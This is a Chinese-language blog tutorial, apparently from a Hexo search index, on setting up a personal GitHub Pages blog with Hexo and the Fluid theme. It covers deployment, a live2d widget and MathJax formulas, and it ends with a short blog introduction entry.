    <content type="html"><![CDATA[<p>搭博客~~</p><span id="more"></span><h3 id="前期准备"><a href="#前期准备" class="headerlink" title="前期准备"></a>前期准备</h3><h4 id="Github账号"><a href="#Github账号" class="headerlink" title="Github账号"></a>Github账号</h4><p>需要有一个<code>GitHub</code>账号，没有的话到 <a href="https://github.com/">官网 </a>申请一个。</p><h4 id="Git"><a href="#Git" class="headerlink" title="Git"></a>Git</h4><p>在自己电脑上安装好<code>Git</code>，<a href="https://so.csdn.net/so/search?q=hexo&spm=1001.2101.3001.7020">hexo</a>部署到<code>GitHub</code>时要用</p><h4 id="Node-js"><a href="#Node-js" class="headerlink" title="Node.js"></a>Node.js</h4><p>官网下载地址：<a href="https://nodejs.org/zh-cn/download/">https://nodejs.org/zh-cn/download/</a></p><img src="/2022/12/09/%E5%9C%A8Github%E4%B8%8A%E6%90%AD%E5%BB%BA%E8%87%AA%E5%B7%B1%E7%9A%84%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/1.png" class=""><p>打开cmd窗口，执行命令 <code>node -v</code> 查看node版本</p><p>如果出现了系统找不到<code>node</code>，可以在系统环境变量中添加</p><img src="/2022/12/09/%E5%9C%A8Github%E4%B8%8A%E6%90%AD%E5%BB%BA%E8%87%AA%E5%B7%B1%E7%9A%84%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/Snipaste_2024-05-14_12-21-48.jpg" class=""><p>在安装node的同时也安装了npm，执行 <code>npm -v</code> 查看npm版本</p><img src="/2022/12/09/%E5%9C%A8Github%E4%B8%8A%E6%90%AD%E5%BB%BA%E8%87%AA%E5%B7%B1%E7%9A%84%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/image-20230808150618974.png" class=""><h4 id="创建仓库"><a href="#创建仓库" class="headerlink" title="创建仓库"></a>创建仓库</h4><p>在<code>GitHub</code>上创建一个新的代码仓库用于保存我们的网页</p><img src="/2022/12/09/%E5%9C%A8Github%E4%B8%8A%E6%90%AD%E5%BB%BA%E8%87%AA%E5%B7%B1%E7%9A%84%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/image-20230808151116734.png" class="" title="image-20230808151116734"><p>填写仓库名，格式必须为<code>&lt;用户名&gt;.github.io</code>，然后点击<code>Create repository</code></p><img src="/2022/12/09/%E5%9C%A8Github%E4%B8%8A%E6%90%AD%E5%BB%BA%E8%87%AA%E5%B7%B1%E7%9A%84%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/image-20230808151259633.png" class="" title="image-20230808151259633"><p>点击<code>creating a new file</code>创建一个新文件，作为我们网站的主页</p><img src="/2022/12/09/%E5%9C%A8Github%E4%B8%8A%E6%90%AD%E5%BB%BA%E8%87%AA%E5%B7%B1%E7%9A%84%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/image-20230808151342603.png" class="" title="image-20230808151342603"><img src="/2022/12/09/%E5%9C%A8Github%E4%B8%8A%E6%90%AD%E5%BB%BA%E8%87%AA%E5%B7%B1%E7%9A%84%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/image-20230808151445824.png" class="" title="image-20230808151445824"><p>首先确定分支，然后重新打开设置GitHub Pages中找到我们主页的地址为 <a href="https://remixxyh.github.io/3xsh0re.github.io/">https://remixxyh.github.io/3xsh0re.github.io/</a></p><img src="/2022/12/09/%E5%9C%A8Github%E4%B8%8A%E6%90%AD%E5%BB%BA%E8%87%AA%E5%B7%B1%E7%9A%84%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/image-20230808152113275.png" class="" title="image-20230808152113275"><h3 id="安装Hexo"><a href="#安装Hexo" class="headerlink" title="安装Hexo"></a>安装Hexo</h3><p>我们采用<code>Hexo</code>来创建我们的博客网站，<code>Hexo</code> 是一个基于<code>NodeJS</code>的静态博客网站生成器，使用<code>Hexo</code>不需开发，只要进行一些必要的配置即可生成一个个性化的博客网站，非常方便。点击进入 <a href="https://hexo.io/zh-cn/">官网</a>。</p><p>安装 <code>Hexo</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">npm install -g hexo-cli<br></code></pre></td></tr></table></figure><p>查看版本</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">hexo -v<br></code></pre></td></tr></table></figure><p>解决报错</p><figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs moonscript">hexo : 无法加载文件 <span class="hljs-name">C</span>:\Users\DELL\AppData\Roaming\npm\hexo.ps1，因为在此系统上禁止运行脚本。有关详细信息，请参阅 <span class="hljs-name">https</span>:<br>/go.microsoft.com/fwlink/?LinkID=<span class="hljs-number">135170</span> 中的 about_Execution_Policies。<br>所在位置 行:<span class="hljs-number">1</span> 字符: <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>打开开发者选项</p><img src="/2022/12/09/%E5%9C%A8Github%E4%B8%8A%E6%90%AD%E5%BB%BA%E8%87%AA%E5%B7%B1%E7%9A%84%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/image-20230808155045188.png" class="" title="image-20230808155045188"><img src="/2022/12/09/%E5%9C%A8Github%E4%B8%8A%E6%90%AD%E5%BB%BA%E8%87%AA%E5%B7%B1%E7%9A%84%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/image-20230808155116199.png" class="" title="image-20230808155116199"><p>成功解决</p><p><img src="/2022/12/09/%E5%9C%A8Github%E4%B8%8A%E6%90%AD%E5%BB%BA%E8%87%AA%E5%B7%B1%E7%9A%84%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/image-20230808155133450.png" alt="image-20230808155133450"></p><p>创建一个项目 <code>hexo-blog</code> 并初始化，踩雷，不能在盘根目录下创建，要建立二级目录才行</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell">hexo init hexo-blog<br>cd hexo-blog<br>npm install<br>hexo g<br>hexo server<br></code></pre></td></tr></table></figure><img src="/2022/12/09/%E5%9C%A8Github%E4%B8%8A%E6%90%AD%E5%BB%BA%E8%87%AA%E5%B7%B1%E7%9A%84%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/image-20230808160800840.png" class="" title="image-20230808160800840"><p>浏览器访问，默认路径<a href="http://localhost:4000，页面默认主图风格如下">http://localhost:4000，页面默认主图风格如下</a></p><img src="/2022/12/09/%E5%9C%A8Github%E4%B8%8A%E6%90%AD%E5%BB%BA%E8%87%AA%E5%B7%B1%E7%9A%84%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/image-20230808160847398.png" class="" title="image-20230808160847398"><h3 id="更换使用Fluid主题"><a href="#更换使用Fluid主题" class="headerlink" title="更换使用Fluid主题"></a>更换使用Fluid主题</h3><p>下载 <a href="https://github.com/fluid-dev/hexo-theme-fluid/releases">最新 release 版本</a> 解压到 <code>themes</code> 目录，并将解压出的文件夹重命名为 <code>fluid</code></p><img src="/2022/12/09/%E5%9C%A8Github%E4%B8%8A%E6%90%AD%E5%BB%BA%E8%87%AA%E5%B7%B1%E7%9A%84%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/image-20230808161347061.png" class="" title="image-20230808161347061"><p>如下修改 <code>Hexo</code> 博客目录中的 <code>_config.yml</code>：</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">theme:</span> fluid  <span class="hljs-meta"># 指定主题</span><br><span class="hljs-symbol">language:</span> <span class="hljs-built_in">zh</span>-CN  <span class="hljs-meta"># 指定语言，会影响主题显示的语言，按需修改</span><br></code></pre></td></tr></table></figure><img src="/2022/12/09/%E5%9C%A8Github%E4%B8%8A%E6%90%AD%E5%BB%BA%E8%87%AA%E5%B7%B1%E7%9A%84%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/image-20230808162045506.png" class="" title="image-20230808162045506"><img src="/2022/12/09/%E5%9C%A8Github%E4%B8%8A%E6%90%AD%E5%BB%BA%E8%87%AA%E5%B7%B1%E7%9A%84%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/image-20230808162106017.png" class="" title="image-20230808162106017"><p>首次使用主题的「关于页」需要手动创建：</p><figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs haxe">hexo <span class="hljs-keyword">new</span> <span class="hljs-type">page</span> about<br></code></pre></td></tr></table></figure><img src="/2022/12/09/%E5%9C%A8Github%E4%B8%8A%E6%90%AD%E5%BB%BA%E8%87%AA%E5%B7%B1%E7%9A%84%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/image-20230808162133409.png" class="" title="image-20230808162133409"><p>创建成功后，编辑博客目录下 /source/about/index.md，添加 layout 属性。</p><p>修改后的文件示例如下：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-meta">---</span><br><span class="hljs-meta"></span><br><span class="hljs-attr">title:</span> <span class="hljs-string">about</span><br><span class="hljs-attr">date:</span> <span class="hljs-number">2023-08-09 19:20:33</span><br><span class="hljs-attr">layout:</span> <span class="hljs-string">about</span><br><span class="hljs-meta">---</span><br></code></pre></td></tr></table></figure><img src="/2022/12/09/%E5%9C%A8Github%E4%B8%8A%E6%90%AD%E5%BB%BA%E8%87%AA%E5%B7%B1%E7%9A%84%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/image-20230808162259101.png" class="" title="image-20230808162259101"><h3 id="博客部署到Github"><a href="#博客部署到Github" class="headerlink" title="博客部署到Github"></a>博客部署到Github</h3><p>安装hexo-deployer-git</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">npm install hexo-deployer-git --save<br></code></pre></td></tr></table></figure><p>修改根目录下的<code> _config.yml</code>，配置 GitHub 相关信息</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">deploy:</span><br><span class="hljs-symbol">  type:</span> git<br><span class="hljs-symbol">  repo:</span> https:<span class="hljs-comment">//token@github.com/remixxyh/remixxyh.github.io.git #免密push</span><br><span class="hljs-symbol">  branch:</span> main<br><span class="hljs-symbol">  token:</span> 你的token<br></code></pre></td></tr></table></figure><img src="/2022/12/09/%E5%9C%A8Github%E4%B8%8A%E6%90%AD%E5%BB%BA%E8%87%AA%E5%B7%B1%E7%9A%84%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/Snipaste_2024-04-23_10-41-16.png" class=""><p>执行命令完成部署，可能出现一些git的报错，自寻搜索即可解决</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">hexo g -d<br></code></pre></td></tr></table></figure><h3 id="图片插件"><a href="#图片插件" class="headerlink" title="图片插件"></a><strong>图片插件</strong></h3><p>插件<code>hexo-renderer-marked</code>解决了这个问题。可以只用<code>npm install hexo-renderer-marked</code>命令直接安装，之后在根目录下的<code>config.yml</code>中更改配置如下：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-attr">post_asset_folder</span>: <span class="hljs-literal">true</span><br><span class="hljs-attr">marked</span>:<br>  <span class="hljs-attr">prependRoot</span>: <span class="hljs-literal">true</span><br>  <span class="hljs-attr">postAsset</span>: <span class="hljs-literal">true</span><br></code></pre></td></tr></table></figure><p>之后就可以在使用<code>![](image.jpg)</code>的方式愉快的插入图片了</p><img src="/2022/12/09/%E5%9C%A8Github%E4%B8%8A%E6%90%AD%E5%BB%BA%E8%87%AA%E5%B7%B1%E7%9A%84%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/Snipaste_2023-09-01_22-41-43.png" class=""><h3 id="个性化fluid"><a href="#个性化fluid" class="headerlink" title="个性化fluid"></a>个性化fluid</h3><h4 id="个性化页面"><a href="#个性化页面" class="headerlink" title="个性化页面"></a>个性化页面</h4><p>修改<code>themes/fluid</code>下的<code>_config.yml</code>，这是主题相关的配置文件</p><img src="/2022/12/09/%E5%9C%A8Github%E4%B8%8A%E6%90%AD%E5%BB%BA%E8%87%AA%E5%B7%B1%E7%9A%84%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/Snipaste_2023-09-01_22-44-04.png" class=""><h5 id="修改浏览器标签"><a href="#修改浏览器标签" class="headerlink" title="修改浏览器标签"></a>修改浏览器标签</h5><img src="/2022/12/09/%E5%9C%A8Github%E4%B8%8A%E6%90%AD%E5%BB%BA%E8%87%AA%E5%B7%B1%E7%9A%84%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/Snipaste_2023-09-01_22-59-38.png" class=""><h5 id="修改导航栏title"><a href="#修改导航栏title" class="headerlink" title="修改导航栏title"></a>修改导航栏title</h5><p>搜索：<code>navbar</code></p><img src="/2022/12/09/%E5%9C%A8Github%E4%B8%8A%E6%90%AD%E5%BB%BA%E8%87%AA%E5%B7%B1%E7%9A%84%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/Snipaste_2023-09-01_23-01-09.png" class=""><h5 id="修改欢迎字样"><a href="#修改欢迎字样" class="headerlink" title="修改欢迎字样"></a>修改欢迎字样</h5><p>搜索：<code>slogan</code></p><img src="/2022/12/09/%E5%9C%A8Github%E4%B8%8A%E6%90%AD%E5%BB%BA%E8%87%AA%E5%B7%B1%E7%9A%84%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/Snipaste_2023-09-01_23-03-16.png" class=""><h5 id="修改关于页面"><a href="#修改关于页面" class="headerlink" title="修改关于页面"></a>修改关于页面</h5><p>在配置文件里搜索：<code>about</code>，即可修改关于页面；图片资源在<code>hexo-blog\themes\fluid\source\img</code>文件夹里添加修改</p><img src="/2022/12/09/%E5%9C%A8Github%E4%B8%8A%E6%90%AD%E5%BB%BA%E8%87%AA%E5%B7%B1%E7%9A%84%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/Snipaste_2023-09-01_22-50-47.png" class=""><p>效果：</p><img src="/2022/12/09/%E5%9C%A8Github%E4%B8%8A%E6%90%AD%E5%BB%BA%E8%87%AA%E5%B7%B1%E7%9A%84%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/Snipaste_2023-09-01_22-52-35.png" class=""><h4 id="添加live2d桌宠"><a href="#添加live2d桌宠" class="headerlink" title="添加live2d桌宠"></a>添加live2d桌宠</h4><h5 id="安装插件"><a href="#安装插件" class="headerlink" title="安装插件"></a>安装插件</h5><p>首先我们需要安装一个插件，用于在<code>hexo</code>里使用<code>live2d</code></p><p><code>npm install --save hexo-helper-live2d</code></p><h5 id="下载安装live2d模型"><a href="#下载安装live2d模型" class="headerlink" title="下载安装live2d模型"></a>下载安装live2d模型</h5><p>通过<code>npm install npm install --save live2d-widget-model-xxx</code>来安装你喜欢的模型</p><p>比方说我喜欢的是小猫猫，那就使用<code>npm install npm install --save live2d-widget-model-tororo</code>进行安装</p><p><a href="https://blog.51cto.com/u_16162646/6494412">模型预览</a></p><p><a href="https://github.com/xiazeyu/live2d-widget-models">模型Github地址</a></p><p>安装后我们在根目录下的<code>node_modules</code>目录下面找到<code>live2d-widget-model-tororo</code>这个文件夹，把这个文件夹复制下来，找到我们的<code>hexo</code>博客的根目录（也可以在根目录新建一个文件夹专门存放模型），把刚刚我们复制的文件粘贴过来</p><img src="/2022/12/09/%E5%9C%A8Github%E4%B8%8A%E6%90%AD%E5%BB%BA%E8%87%AA%E5%B7%B1%E7%9A%84%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/Snipaste_2023-09-01_23-18-54.png" class=""><h5 id="添加配置文件"><a href="#添加配置文件" class="headerlink" title="添加配置文件"></a>添加配置文件</h5><p>在根目录下的<code>_config.yml</code>配置，这样以后换了主题就不用重新配置了，<strong>注意在<code>model</code>那里填写自己的模型文件名称</strong></p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">live2d:</span><br>  <span class="hljs-attr">enable:</span> <span class="hljs-literal">true</span>  <span class="hljs-comment"># 是否启动</span><br>  <span class="hljs-attr">scriptFrom:</span> <span class="hljs-string">local</span> <span class="hljs-comment"># 默认</span><br>  <span class="hljs-attr">pluginRootPath:</span> <span class="hljs-string">live2dw/</span>  <span class="hljs-comment"># 插件在站点上的根目录(相对路径)</span><br>  <span class="hljs-attr">pluginJsPath:</span> <span class="hljs-string">lib/</span>  <span class="hljs-comment"># 脚本文件相对与插件根目录路径</span><br>  <span class="hljs-attr">pluginModelPath:</span> <span class="hljs-string">assets/</span>  <span class="hljs-comment"># 模型文件相对与插件根目录路径</span><br>  <span class="hljs-attr">tagMode:</span> <span class="hljs-literal">false</span>  <span class="hljs-comment"># 标签模式, 是否仅替换 live2d tag标签而非插入到所有页面中</span><br>  <span class="hljs-attr">debug:</span> <span class="hljs-literal">false</span>  <span class="hljs-comment"># 调试, 是否在控制台输出日志</span><br>  <span class="hljs-attr">model:</span><br>    <span class="hljs-attr">use:</span> <span class="hljs-string">live2d-widget-model-tororo</span> <span class="hljs-comment">## 模型文件</span><br>  <span class="hljs-attr">display:</span><br>    <span class="hljs-attr">position:</span> <span class="hljs-string">right</span> <span class="hljs-comment"># 定位方向 left right top bottom</span><br>    <span class="hljs-attr">width:</span> <span class="hljs-number">150</span>  <span class="hljs-comment"># 小人宽度</span><br>    <span class="hljs-attr">height:</span> <span class="hljs-number">300</span> <span class="hljs-comment">#  小人高度</span><br>    <span class="hljs-attr">hOffset:</span> <span class="hljs-number">-15</span>  <span class="hljs-comment"># 向 偏移</span><br>    <span class="hljs-attr">vOffset:</span> <span class="hljs-number">-15</span>  <span class="hljs-comment"># 像 偏移</span><br>  <span class="hljs-attr">mobile:</span><br>    <span class="hljs-attr">show:</span> <span class="hljs-literal">true</span>  <span class="hljs-comment"># 手机端是否显示</span><br>  <span class="hljs-attr">react:</span><br>    <span class="hljs-attr">opacity:</span> <span class="hljs-number">0.7</span>  <span class="hljs-comment"># 模型透明度</span><br></code></pre></td></tr></table></figure><p>添加到文件末尾即可：</p><img src="/2022/12/09/%E5%9C%A8Github%E4%B8%8A%E6%90%AD%E5%BB%BA%E8%87%AA%E5%B7%B1%E7%9A%84%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/Snipaste_2023-09-01_23-10-54.png" class=""><p>然后你就成功拥有一只小猫啦！</p><img src="/2022/12/09/%E5%9C%A8Github%E4%B8%8A%E6%90%AD%E5%BB%BA%E8%87%AA%E5%B7%B1%E7%9A%84%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/Snipaste_2023-09-01_23-19-57.png" class=""><h3 id="数学公式"><a href="#数学公式" class="headerlink" title="数学公式"></a>数学公式</h3><h4 id="步骤1-卸载hexo-math"><a href="#步骤1-卸载hexo-math" class="headerlink" title="步骤1:卸载hexo-math"></a>步骤1:卸载hexo-math</h4><p>  在你的Hexo框架的blog根目录下打开终端，输入以下指令:</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lua">npm uninstall hexo-<span class="hljs-built_in">math</span> <span class="hljs-comment">--save</span><br></code></pre></td></tr></table></figure><h4 id="步骤2-安装hexo-filter-mathjax"><a href="#步骤2-安装hexo-filter-mathjax" class="headerlink" title="步骤2:安装hexo-filter-mathjax"></a>步骤2:安装hexo-filter-mathjax</h4><p>  同样在你的blog根目录下，安装插件:</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">npm install hexo-<span class="hljs-attribute">filter</span>-mathjax  <span class="hljs-attr">--save</span><br></code></pre></td></tr></table></figure><h4 id="步骤3-在全局配置中配置公式渲染"><a href="#步骤3-在全局配置中配置公式渲染" class="headerlink" title="步骤3:在全局配置中配置公式渲染"></a>步骤3:在全局配置中配置公式渲染</h4><p>   在你的Hexo框架的blog根目录下打开<code>_config.yml</code>文件，在文件中加入如下内容:</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">mathjax:</span><br>  <span class="hljs-attr">tags:</span> <span class="hljs-string">none</span> <span class="hljs-comment"># or 'ams' or 'all'</span><br>  <span class="hljs-attr">single_dollars:</span> <span class="hljs-literal">true</span> <span class="hljs-comment"># enable single dollar signs as in-line math delimiters</span><br>  <span class="hljs-attr">cjk_width:</span> <span class="hljs-number">0.9</span> <span class="hljs-comment"># relative CJK char width</span><br>  <span class="hljs-attr">normal_width:</span> <span class="hljs-number">0.6</span> <span class="hljs-comment"># relative normal (monospace) width</span><br>  <span class="hljs-attr">append_css:</span> <span class="hljs-literal">true</span> <span class="hljs-comment"># add CSS to pages rendered by MathJax</span><br>  <span class="hljs-attr">every_page:</span> <span class="hljs-literal">false</span> <span class="hljs-comment"># if true, every page will be rendered by MathJax regardless the `mathjax` setting in Front-matter</span><br></code></pre></td></tr></table></figure><p>各个参数的用处可以看代码注释。没有特别需求基本不需要更改。</p><h4 id="步骤4-需要公式的博客文章启用公式渲染器"><a href="#步骤4-需要公式的博客文章启用公式渲染器" class="headerlink" title="步骤4:需要公式的博客文章启用公式渲染器"></a>步骤4:需要公式的博客文章启用公式渲染器</h4><p>在你写的，需要使用公式的markdown文档的front-matter中添加一个参数：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">mathjax:</span> <span class="hljs-literal">true</span><br></code></pre></td></tr></table></figure><p>以本博客的front-matter为例:</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-meta">---</span><br><span class="hljs-attr">title:</span> <span class="hljs-string">在Github上搭建自己的个人博客</span><br><span class="hljs-attr">date:</span> <span class="hljs-number">2022-12-09 10:01:49</span><br><span class="hljs-attr">categories:</span> <span class="hljs-string">杂项</span><br><span class="hljs-attr">tags:</span> [<span class="hljs-string">Github博客搭建</span>]<br><span class="hljs-attr">mathjax:</span> <span class="hljs-literal">true</span><br><span class="hljs-meta">---</span><br></code></pre></td></tr></table></figure><p>如果你认为给单独一篇文章加参数太麻烦，你也可以在<code>_config.yml</code>文件中刚刚添加的<code>mathjax</code>设定下，把<code>every_page</code>的参数改为<code>ture</code>。</p>]]></content>
    
    
    <categories>
      
      <category>杂项</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Github博客搭建</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>博客简介</title>
    <link href="/2022/12/08/%E5%8D%9A%E5%AE%A2%E7%AE%80%E4%BB%8B/"/>
    <url>/2022/12/08/%E5%8D%9A%E5%AE%A2%E7%AE%80%E4%BB%8B/</url>
    
    <content type="html"><![CDATA[<h2 id="欢迎来到3xsh0re的博客"><a href="#欢迎来到3xsh0re的博客" class="headerlink" title="欢迎来到3xsh0re的博客"></a>欢迎来到3xsh0re的博客</h2><span id="more"></span><p>USTB大三在读，信息安全专业</p><p>浅浅记录，什么都更，maybe就是个日记本哈哈😋</p><img src="/2022/12/08/%E5%8D%9A%E5%AE%A2%E7%AE%80%E4%BB%8B/Pikachu.png" class="">]]></content>
    
    
    <categories>
      
      <category>杂项</category>
      
    </categories>
    
    
    <tags>
      
      <tag>简介</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
